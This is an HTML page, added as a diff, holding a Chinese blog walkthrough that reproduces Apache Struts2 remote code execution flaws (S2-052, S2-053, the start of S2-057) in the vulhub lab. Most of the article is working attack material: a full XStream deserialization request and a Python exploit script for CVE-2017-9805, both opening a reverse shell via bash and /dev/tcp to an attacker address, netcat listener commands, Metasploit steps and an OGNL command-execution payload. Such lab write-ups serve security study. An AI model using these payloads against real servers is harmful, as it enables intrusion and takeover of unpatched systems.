@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="obsem">
+
+
+
+<meta name="description" content="0x01、S2-052 远程代码执行漏洞原理 Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vuhub靶场struts2漏洞复现（四）">
+<meta property="og:url" content="http://yoursite.com/2021/01/27/vulhub靶场struts2漏洞复现（四）/index.html">
+<meta property="og:site_name" content="obsetear">
+<meta property="og:description" content="0x01、S2-052 远程代码执行漏洞原理 Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-052/s2-052-01.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-052/s2-052-02.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-052/s2-052-03.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-052/s2-052-04.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-052/s2-052-05.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-053/s2-053.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-057/s2-057-01.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-057/s2-057-02.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-059/s2-059-01.jpg">
+<meta property="og:image" content="http://yoursite.com/img/shentou/vulhub/s2-059/s2-059-02.jpg">
+<meta property="og:updated_time" content="2021-03-06T07:56:47.545Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vuhub靶场struts2漏洞复现（四）">
+<meta name="twitter:description" content="0x01、S2-052 远程代码执行漏洞原理 Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：">
+<meta name="twitter:image" content="http://yoursite.com/img/shentou/vulhub/s2-052/s2-052-01.jpg">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="obsetear" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>vuhub靶场struts2漏洞复现（四） | obsetear</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">obsem</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">obsem</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">obsem</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-vulhub靶场struts2漏洞复现（四）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/27/vulhub靶场struts2漏洞复现（四）/" class="article-date">
+      <time datetime="2021-01-26T16:00:00.000Z" itemprop="datePublished">2021-01-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      vuhub靶场struts2漏洞复现（四）
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01、S2-052-远程代码执行漏洞"><a href="#0x01、S2-052-远程代码执行漏洞" class="headerlink" title="0x01、S2-052 远程代码执行漏洞"></a>0x01、S2-052 远程代码执行漏洞</h2><p><strong>原理</strong></p>
+<p>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p>
+<a id="more"></a>
+<table>
+<thead>
+<tr>
+<th>扩展名</th>
+<th>Content-Type</th>
+<th>解析方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xml</td>
+<td>application/xml</td>
+<td>xstream</td>
+</tr>
+<tr>
+<td>json</td>
+<td>application/json</td>
+<td>jsonlib或jackson(可选)</td>
+</tr>
+<tr>
+<td>xhtml</td>
+<td>application/xhtml+xml</td>
+<td>无</td>
+</tr>
+<tr>
+<td>无</td>
+<td>application/x-www-form-urlencoded</td>
+<td>无</td>
+</tr>
+<tr>
+<td>无</td>
+<td>multipart/form-data</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;classname&gt;&lt;/classname&gt;</span><br><span class="line">//或者</span><br><span class="line">&lt;paramname class=&quot;classname&quot;&gt;&lt;/paramname&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget。</p>
+<p><strong>影响版本</strong></p>
+<p>Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
+<p><strong>漏洞复现</strong></p>
+<p>打开终端，使用<code>NetCat</code>监听本地端口<code>8001</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8001</span><br></pre></td></tr></table></figure>
+
+<p>将下列payload修改后粘贴到burp中，发包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">POST /orders HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 2468</span><br><span class="line">Cookie: JSESSIONID=A82EAA2857Aq1FFAF61FF24A1FBB4A3C7</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line">    &lt;entry&gt;</span><br><span class="line">        &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">            &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">            &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">                &lt;dataHandler&gt;</span><br><span class="line">                    &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">                        &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">                            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                                    &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                                        &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot; /&gt;</span><br><span class="line">                                        &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                                            &lt;command&gt;</span><br><span class="line">                                                &lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/xxx.xxx.xxx.xxx/8001 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">                                            &lt;/command&gt;</span><br><span class="line">                                            &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                                        &lt;/next&gt;</span><br><span class="line">                                    &lt;/iter&gt;</span><br><span class="line">                                    &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                                        &lt;method&gt;</span><br><span class="line">                                            &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                                            &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                                            &lt;parameter-types /&gt;</span><br><span class="line">                                        &lt;/method&gt;</span><br><span class="line">                                        &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                                    &lt;/filter&gt;</span><br><span class="line">                                    &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                                &lt;/serviceIterator&gt;</span><br><span class="line">                                &lt;lock /&gt;</span><br><span class="line">                            &lt;/cipher&gt;</span><br><span class="line">                            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot; /&gt;</span><br><span class="line">                            &lt;ibuffer /&gt;</span><br><span class="line">                            &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">                            &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">                            &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">                            &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">                        &lt;/is&gt;</span><br><span class="line">                        &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">                    &lt;/dataSource&gt;</span><br><span class="line">                    &lt;transferFlavors /&gt;</span><br><span class="line">                &lt;/dataHandler&gt;</span><br><span class="line">                &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">        &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot; /&gt;</span><br><span class="line">    &lt;/entry&gt;</span><br><span class="line">    &lt;entry&gt;</span><br><span class="line">        &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot; /&gt;</span><br><span class="line">        &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot; /&gt;</span><br><span class="line">    &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/vulhub/s2-052/s2-052-01.jpg">
+
+
+<p>监听段就会得到shell</p>
+<img src="/img/shentou/vulhub/s2-052/s2-052-02.jpg">
+
+<p>也可用下列python脚本实现攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># coding=utf-8</span><br><span class="line"># Struts CVE-2017-9805 Exploit</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">def exploration(ip, port):</span><br><span class="line"> </span><br><span class="line">    exploit = &apos;&apos;&apos;</span><br><span class="line">                &lt;map&gt;</span><br><span class="line">                &lt;entry&gt;</span><br><span class="line">                &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">                &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">                &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">                &lt;dataHandler&gt;</span><br><span class="line">                &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">                &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">                &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                &lt;command&gt;</span><br><span class="line">                &lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">                &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&apos;&apos;&apos;+ ip +&apos;&apos;&apos;/&apos;&apos;&apos;+ port +&apos;&apos;&apos; 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">                &lt;/command&gt;</span><br><span class="line">                &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                &lt;/next&gt;</span><br><span class="line">                &lt;/iter&gt;</span><br><span class="line">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                &lt;method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types/&gt;</span><br><span class="line">                &lt;/method&gt;</span><br><span class="line">                &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                &lt;/filter&gt;</span><br><span class="line">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">                &lt;/cipher&gt;</span><br><span class="line">                &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">                &lt;ibuffer/&gt;</span><br><span class="line">                &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">                &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">                &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">                &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">                &lt;/is&gt;</span><br><span class="line">                &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">                &lt;/dataSource&gt;</span><br><span class="line">                &lt;transferFlavors/&gt;</span><br><span class="line">                &lt;/dataHandler&gt;</span><br><span class="line">                &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">                &lt;/value&gt;</span><br><span class="line">                &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">                &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">                &lt;/entry&gt;</span><br><span class="line">                &lt;entry&gt;</span><br><span class="line">                &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">                &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">                &lt;/entry&gt;</span><br><span class="line">                &lt;/map&gt;</span><br><span class="line">                &apos;&apos;&apos;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    url = &quot;http://127.0.0.1/struts2-rest-showcase/orders/3/edit&quot;</span><br><span class="line"> </span><br><span class="line">    headers = &#123;&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0&apos;,</span><br><span class="line">            &apos;Content-Type&apos;: &apos;application/xml&apos;&#125;</span><br><span class="line"> </span><br><span class="line">    request = requests.post(url, data=exploit, headers=headers)</span><br><span class="line"> </span><br><span class="line">if len(sys.argv) &lt; 3:</span><br><span class="line">    print (&apos;CVE: 2017-9805 - Apache Struts2 Rest Plugin Xstream RCE&apos;)</span><br><span class="line">    print (&apos;[*] Use: python exploit.py &lt;attacker ip&gt; &lt;attacker port&gt;&apos;)</span><br><span class="line">    print (&apos;[*] Example: python exploit.py 10.30.178.227 8001&apos;)</span><br><span class="line">    exit(0)</span><br><span class="line">else:</span><br><span class="line">    exploration(sys.argv[1], sys.argv[2])</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8001</span><br><span class="line"># Use: python exploit.py &lt;attacker ip&gt; &lt;attacker port&gt;</span><br><span class="line">python exploit.py 10.30.178.227 8001</span><br></pre></td></tr></table></figure>
+
+<p>也可使用msf进行操作</p>
+<p><a href="https://github.com/wvu-r7/metasploit-framework/blob/5ea83fee5ee8c23ad95608b7e2022db5b48340ef/modules/exploits/multi/http/struts2_rest_xstream.rb" target="_blank" rel="noopener">struts2_rest_xstream.rb</a> </p>
+<p>下载脚本放到 /usr/share/metasploit-framework/modules/exploits/multi/http/struts2_052.rb 目录下</p>
+<p>使用search命令可能搜索不出来</p>
+<p>直接使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/struts2_052</span><br></pre></td></tr></table></figure>
+
+<img src="/img/shentou/vulhub/s2-052/s2-052-03.jpg">
+
+<p>设置相应的参数并执行</p>
+<img src="/img/shentou/vulhub/s2-052/s2-052-04.jpg">
+
+<p> 默认的payload是： linux/x64/meterpreter_reverse_https ，也可以使用其他的payload</p>
+<img src="/img/shentou/vulhub/s2-052/s2-052-05.jpg">
+
+<p>脚本地址：<a href="https://github.com/Vancir/s2-052-reproducing" target="_blank" rel="noopener">https://github.com/Vancir/s2-052-reproducing</a></p>
+<h2 id="0x02、S2-053-远程代码执行漏洞"><a href="#0x02、S2-053-远程代码执行漏洞" class="headerlink" title="0x02、S2-053 远程代码执行漏洞"></a>0x02、S2-053 远程代码执行漏洞</h2><p><strong>原理</strong></p>
+<p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<p><strong>影响版本</strong></p>
+<p>Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10</p>
+<p><strong>复现过程</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;id&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述Payload末尾的<strong>换行</strong>不能掉</p>
+<img src="/img/shentou/vulhub/s2-053/s2-053.jpg">
+
+<h2 id="0x03、S2-057-远程代码执行漏洞"><a href="#0x03、S2-057-远程代码执行漏洞" class="headerlink" title="0x03、S2-057 远程代码执行漏洞"></a>0x03、S2-057 远程代码执行漏洞</h2><p><strong>原理</strong></p>
+<p>当Struts2的配置满足以下条件时：</p>
+<ul>
+<li>alwaysSelectFullNamespace值为true</li>
+<li>action元素未设置namespace属性，或使用了通配符</li>
+</ul>
+<p>namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。</p>
+<p><strong>影响版本</strong></p>
+<p>小于等于 Struts 2.3.34 与 Struts 2.5.16</p>
+<p><strong>复现过程</strong></p>
+<p>访问<code>http://your-ip:8080/showcase/</code></p>
+<p>测试OGNL表达式<code>${233*233}</code></p>
+<p><code>http://192.168.184.128:8080/showcase/%24%7b%32%33%33%2a%32%33%33%7d/actionChain1.action</code></p>
+<img src="/img/shentou/vulhub/s2-057/s2-057-01.jpg">
+
